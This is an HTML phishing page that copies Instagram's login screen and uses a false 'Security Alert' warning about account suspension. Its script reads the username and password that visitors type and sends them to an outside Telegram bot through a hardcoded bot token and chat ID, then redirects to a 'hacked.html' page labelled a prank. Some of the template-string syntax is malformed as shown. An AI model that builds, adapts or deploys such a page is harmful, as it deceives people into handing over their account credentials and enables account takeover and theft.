<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 350px;
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            box-sizing: border-box;
        }
        .warning {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin-bottom: 15px;
            font-weight: 500;
            display: none;
        }
        .logo {
            width: 175px;
            margin: 20px auto;
            display: block;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 9px 0 7px 8px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px;
            margin: 10px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            opacity: 0.7;
        }
        button:hover {
            opacity: 1;
        }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 20px;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
        <div class="warning">Security Alert: Verify your number or account may be suspended!</div>
        <input type="text" placeholder="Phone number, username, or email" id="username">
        <input type="password" placeholder="Password" id="password">
        <button onclick="sendToTelegram()">Log In</button>
        <div class="divider">OR</div>
        <div class="footer">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        function sendToTelegram() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
            let warning = document.querySelector(".warning");

            if (username && password) {
                let message = New Login Attempt!\nUsername: ${username}\nPassword: ${password};
                let botToken = "7799594978:AAFdhqPny89rEaPL555gFDXuwH1JuMIlkok"; // Tera bot token
                let chatId = "7711813869"; // Tera chat ID
                let url = 'https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}';

                fetch(url)
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log("Telegram pe bhej diya: ", message);
                            window.location.href = "hacked.html"; // Redirect to prank page
                        } else {
                            alert("Kuch gadbad ho gaya, try again!");
                        }
                    })
                    .catch(error => console.error("Error:", error));
            } else {
                warning.style.display = "block";
            }
        }
    </script>
</body>
</html>
